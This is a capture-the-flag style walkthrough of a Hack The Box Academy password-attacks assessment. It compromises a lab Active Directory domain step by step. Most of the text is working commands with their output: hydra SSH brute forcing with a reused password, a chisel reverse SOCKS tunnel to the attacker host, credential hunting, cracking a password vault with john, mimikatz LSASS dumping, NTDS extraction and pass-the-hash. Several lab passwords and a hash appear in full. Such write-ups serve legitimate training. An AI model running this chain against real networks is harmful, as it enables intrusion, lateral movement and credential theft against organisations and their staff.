# [Password Attacks](https://academy.hackthebox.com/module/details/147)

## Skills Assessment - Password Attacks

> `Betty Jayde` works at `Nexura LLC`. We know she uses the password `Texas123!@#` on multiple websites, and we believe she may reuse it at work. Infiltrate Nexura's network and gain command execution on the domain controller. The following hosts are in-scope for this assessment:

|Host|IP Address|
|---|---|
|`DMZ01`|`10.129.35.253` **(External)**, `172.16.119.13` **(Internal)**|
|`JUMP01`|`172.16.119.7`|
|`FILE01`|`172.16.119.10`|
|`DC01`|`172.16.119.11`|

> The internal hosts (`JUMP01`, `FILE01`, `DC01`) reside on a private subnet that is not directly accessible from our attack host. The only externally reachable system is `DMZ01`, which has a second interface connected to the internal network. This segmentation reflects a classic DMZ setup, where public-facing services are isolated from internal infrastructure.
> To access these internal systems, we must first gain a foothold on `DMZ01`. From there, we can `pivot` — that is, route our traffic through the compromised host into the private network. This enables our tools to communicate with internal hosts as if they were directly accessible. After compromising the DMZ, refer to the module `cheatsheet` for the necessary commands to set up the pivot and continue your assessment.

Questions:
1. What is the NTLM hash of NEXURA\Administrator? `36e09***************************`

### External Information Gathering

```
┌──(nabla㉿kali)-[~]
└─$ ifconfig tun0
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.15.60  netmask 255.255.254.0  destination 10.10.15.60

[SNIP]
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -Pn -sS -p- 10.129.35.253 -T5

[SNIP]

PORT   STATE SERVICE
22/tcp open  ssh
```

### Login Brute Forcing

```
┌──(nabla㉿kali)-[~]
└─$ username-anarchy Betty Jayde | tee betty.txt

betty
bettyjayde
betty.jayde
bettyjay
bettjayd
bettyj
b.jayde
bjayde
jbetty
j.betty
jaydeb
jayde
jayde.b
jayde.betty
bj
```

```
┌──(nabla㉿kali)-[~]
└─$ hydra -L betty.txt -p 'Texas123!@#' ssh://10.129.35.253

[SNIP]

[22][ssh] host: 10.129.35.253   login: jbetty   password: Texas123!@#
```

```yaml
credentials:
    username: jbetty
    password: 'Texas123!@#'
    host: 10.129.35.253 (DMZ01)
    port: 22 (SSH)
```

```
┌──(nabla㉿kali)-[~]
└─$ ssh jbetty@10.129.35.253

jbetty@10.129.35.253's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

[SNIP]

jbetty@DMZ01:~$
```

### Internal Information Gathering

```
jbetty@DMZ01:~$ ifconfig

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.35.253  netmask 255.255.0.0  broadcast 10.129.255.255

[SNIP]

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.119.13  netmask 255.255.255.0  broadcast 172.16.119.255
```

```
jbetty@DMZ01:~$ for i in $(seq 254); do ping 172.16.119.$i -c1 -W1 & done | grep 'from'

64 bytes from 172.16.119.13: icmp_seq=1 ttl=64 time=0.013 ms
64 bytes from 172.16.119.11: icmp_seq=1 ttl=128 time=0.409 ms
```

```
┌──(nabla㉿kali)-[~]
└─$ wget https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/nmap && chmod u+x nmap
```

```
┌──(nabla㉿kali)-[~]
└─$ scp nmap jbetty@10.129.31.247:~/
```

```
jbetty@DMZ01:~$ ./nmap -Pn -sT -p- 172.16.119.7 -T4

[SNIP]

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
5985/tcp open  unknown
```

```
jbetty@DMZ01:~$ ./nmap -Pn -sT -p- 172.16.119.10 -T4

[SNIP]

PORT     STATE SERVICE
135/tcp  open  epmap
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  unknown
```

```
jbetty@DMZ01:~$ ./nmap -Pn -sT -p- 172.16.119.11 -T4

[SNIP]

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos
135/tcp   open  epmap
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd
593/tcp   open  unknown
636/tcp   open  ldaps
3268/tcp  open  unknown
3269/tcp  open  unknown
3389/tcp  open  ms-wbt-server
5985/tcp  open  unknown
9389/tcp  open  unknown
49668/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49680/tcp open  unknown
49698/tcp open  unknown
49727/tcp open  unknown
```

### SOCKS5 Tunneling with Chisel

```
┌──(nabla㉿kali)-[~]
└─$ wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz && gunzip chisel* && mv chisel* chisel && chmod u+x chisel
```

```
┌──(nabla㉿kali)-[~]
└─$ scp chisel jbetty@10.129.31.247:~/
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo chisel server --reverse -v -p 1234 --socks5

2025/07/09 02:49:20 server: Reverse tunnelling enabled
2025/07/09 02:49:20 server: Fingerprint +7Ht1kSGkmCSxjfg3PibJIOjZ5gCwPUEgaZ6Qi4UQTI=
2025/07/09 02:49:20 server: Listening on http://0.0.0.0:1234

[CONTINUE]
```

```
jbetty@DMZ01:~$ ./chisel client -v 10.10.15.60:1234 R:socks &

2025/07/09 07:52:00 client: Connecting to ws://10.10.15.60:1234
2025/07/09 07:52:00 client: Handshaking...
2025/07/09 07:52:00 client: Sending config
2025/07/09 07:52:00 client: Connected (Latency 7.190364ms)
2025/07/09 07:52:00 client: tun: SSH connected
```

```
[CONTINUE]

2025/07/09 02:50:27 server: session#1: Handshaking with 10.129.31.247:47636...
2025/07/09 02:50:27 server: session#1: Verifying configuration
2025/07/09 02:50:27 server: session#1: tun: Created (SOCKS enabled)
2025/07/09 02:50:27 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
2025/07/09 02:50:27 server: session#1: tun: Bound proxies
2025/07/09 02:50:27 server: session#1: tun: SSH connected
```

```
┌──(nabla㉿kali)-[~]
└─$ tail -5 /etc/proxychains.conf

[SNIP]

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1080
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q netexec smb 172.16.119.11

SMB         172.16.119.11   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:nexura.htb) (signing:True) (SMBv1:False)
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo vim /etc/hosts

[SNIP]

172.16.119.7	JUMP01.nexura.htb
172.16.119.10	FILE01.nexura.htb
172.16.119.11	DC01.nexura.htb DC01 nexura.htb
172.16.119.13	DMZ01.nexura.htb
```

### Credential Hunting - File System (Windows)

```
jbetty@DMZ01:~$ cat /home/jbetty/.bash_history

[SNIP]

sshpass -p "deale**************" ssh hwilliam@file01
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q netexec rdp 172.16.119.7 -u hwilliam -p 'deale**************'

[SNIP]

RDP         172.16.119.7    3389   JUMP01           [+] nexura.htb\hwilliam:deale************** (Pwn3d!)
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q netexec winrm 172.16.119.7 -u hwilliam -p 'deale**************'

[SNIP]

WINRM       172.16.119.7    5985   JUMP01           [+] nexura.htb\hwilliam:deale************** (Pwn3d!)
```

```yaml
credentials:
    username: nexura.htb\hwilliam
    password: 'deale**************'
    host: 172.16.119.7 (JUMP01)
    port: 3389,5985 (RDP,WINRM)
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q netexec smb 172.16.119.11 -u hwilliam -p 'deale**************' --users | awk '{print $5}' | grep -v -E 'Username|]' | awk '{print tolower($s0)}' | tee nexura_ad_users.txt

administrator
guest
krbtgt
bdavid
stom
hwilliam
```

```
┌──(nabla㉿kali)-[~]
└─$ proxychains -q evil-winrm -i 172.16.119.7 -u hwilliam -p 'deale**************'

[SNIP]

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\hwilliam\Documents>
```

```
┌──(nabla㉿kali)-[~]
└─$ proxychains -q xfreerdp /v:172.16.119.7 /u:hwilliam /p:'deale**************' /dynamic-resolution /drive:shared,~/shared +clipboard /cert-ignore
```

### Credential Hunting - Network Shares (Windows)

```
PS C:\Users\hwilliam> C://Users//hwilliam//Desktop//Snaffler.exe --domainusers --outfile C://Users//hwilliam//Desktop//snaffler.output

[SNIP]

[NEXURA\hwilliam@JUMP01] 2025-07-09 10:37:00Z [File] {Black}<KeepPassMgrsByExtension|R|^\.psafe3$|1.1kB|2025-04-29 15:09:57Z>(\\FILE01.nexura.htb\HR\Archive\Employee-Passwords_OLD.psafe3) .psafe3
```

### Password Cracking

```
┌──(nabla㉿kali)-[~]
└─$ pwsafe2john shared/Employee-Passwords_OLD.psafe3 > employee_passwords.john
```

```
┌──(nabla㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt employee_passwords.john

[SNIP]

micha*********   (Employee-Passwords_OLD)
```

```
*Evil-WinRM* PS C:\Users\hwilliam\Documents> type C://Users//hwilliam//Desktop//Employee-Passwords_OLD.txt

Group/Title	Username	Password	Two Factor Key	TOTP Config	TOTP Start Time	TOTP Time Step	TOTP Length	URL	AutoType	Created Time	Password Modified Time	Last Access Time	Password Expiry Date	Password Expiry Interval	Record Modified Time	Password Policy	Password Policy Name	History	Run Command	DCA	Shift+DCA	e-mail	Protected	Symbols	Keyboard Shortcut	Notes

DMZ01.Betty Jayde	jbetty	xiao-nicer-wheels5								2025/04/29 10:02:36			00000		-1	-1		N			""
Domain Users.David Brittni	bdavid	caram****************								2025/04/29 10:00:45		2025/04/29 10:02:26			00000		-1	-1		N			""
Domain Users.Tom Sandy	stom	fails-nibble-disturb4								2025/04/29 10:01:32			2025/04/29 10:02:24			00000		-1	-1		N			""
Domain Users.William Hallam	hwilliam	warned-wobble-occur8								2025/04/29 10:01:50	2025/04/29 10:02:25			00000		-1	-1		N			""
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q netexec smb 172.16.119.11 -u bdavid -p 'caram****************'

[SNIP]

SMB         172.16.119.11   445    DC01             [+] nexura.htb\bdavid:caram**************** 
```

```yaml
credentials:
    username: nexura.htb\bdavid
    password: 'caram****************'
    host: 172.16.119.7 (JUMP01)
    port: 3389 (RDP)
```

```
┌──(nabla㉿kali)-[~]
└─$ proxychains -q xfreerdp /v:172.16.119.7 /u:bdavid /p:'caram****************' /dynamic-resolution /drive:shared,~/shared +clipboard /cert-ignore
```

### Extract Credentials (from LSASS Process Memory Dump) - Locally

```
PS C:\Users\bdavid\Desktop> ./mimikatz.exe "token::elevate" "sekurlsa::logonpasswords" "exit"

[SNIP]

Authentication Id : 0 ; 265165 (00000000:00040bcd)
Session           : RemoteInteractive from 2
User Name         : stom
Domain            : NEXURA
Logon Server      : DC01
Logon Time        : 7/10/2025 10:28:09 AM
SID               : S-1-5-21-1333759777-277832620-2286231135-1106
        msv :
         [00000003] Primary
         * Username : stom
         * Domain   : NEXURA
         * NTLM     : 21ea958524cfd9a7791737f8d2f764fa
         * SHA1     : f2fc2263e4d7cff0fbb19ef485891774f0ad6031
         * DPAPI    : 06e85cb199e902a0145ff04963e7dd72
        tspkg :
        wdigest :
         * Username : stom
         * Domain   : NEXURA
         * Password : (null)
        kerberos :
         * Username : stom
         * Domain   : NEXURA.HTB
         * Password : calve****************
        ssp :
        credman :
```

```yaml
credentials:
    username: nexura.htb\stom
    password: 'calve****************'
    host: 172.16.119.11 (DC01)
    port: 445 (SMB)
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q netexec smb 172.16.119.11 -u stom -p 'calve****************'

[SNIP]

SMB         172.16.119.11   445    DC01             [+] nexura.htb\stom:calve**************** (Pwn3d!)
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q netexec smb 172.16.119.11 -u stom -p 'calve****************' --groups 'Domain Admins'

[SNIP]

SMB         172.16.119.11   445    DC01             [+] Enumerated members of domain group
SMB         172.16.119.11   445    DC01             nexura.htb\stom
SMB         172.16.119.11   445    DC01             nexura.htb\Administrator
```

### Extract Credentials (from NTDS.dit AD Database) - Remotely

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q netexec smb 172.16.119.11 -u stom -p 'calve****************' -M ntdsutil

[SNIP]

NTDSUTIL    172.16.119.11   445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    172.16.119.11   445    DC01             Administrator:500:aad3b***************************:36e09***************************::: 📌

[SNIP]
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo proxychains -q netexec smb 172.16.119.11 -u administrator -H '36e09***************************'

[SNIP]

SMB         172.16.119.11   445    DC01             [+] nexura.htb\administrator:36e09*************************** (Pwn3d!)
```

```yaml
credentials:
    username: nexura.htb\Administrator
    NTLM hash: '36e09***************************'
    host: 172.16.119.11 (DC01)
    port: 445,3389,5985 (SMB,RDP,WINRM)
```

---
---
